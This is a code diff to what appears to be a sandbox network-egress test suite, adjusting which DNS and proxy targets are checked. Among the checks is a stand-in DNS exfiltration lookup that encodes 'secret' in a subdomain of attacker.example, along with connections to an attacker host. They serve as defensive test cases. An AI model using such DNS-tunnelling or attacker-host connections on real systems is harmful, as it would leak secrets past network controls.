@@ -50,7 +50,7 @@ function api(port, path, headers = {}) {
 }
 
 const checks = {
-  dnsAllowed: () => dns.resolve4("api.anthropic.com"),
+  dnsAllowed: () => dns.resolve4("example.com"),
   dnsOther: () => dns.resolve4("pypi.org"),
   dnsExfil: () => dns.resolveTxt("exfil-c2VjcmV0.attacker.example"),
   directPublic: () => direct("1.1.1.1", 443),
@@ -58,6 +58,7 @@ const checks = {
   directAttacker: () => direct(attacker, 9000),
   connectAllowed: () => connectVia("example.com:443"),
   connectGithub: () => connectVia("github.com:443"),
+  connectVendor: () => connectVia("api.anthropic.com:443"),
   connectLoopbackName: () => connectVia("localtest.me:443"),
   connectAttacker: () => connectVia(`${attacker}:9000`),
   connectPort: () => connectVia("example.com:22"),
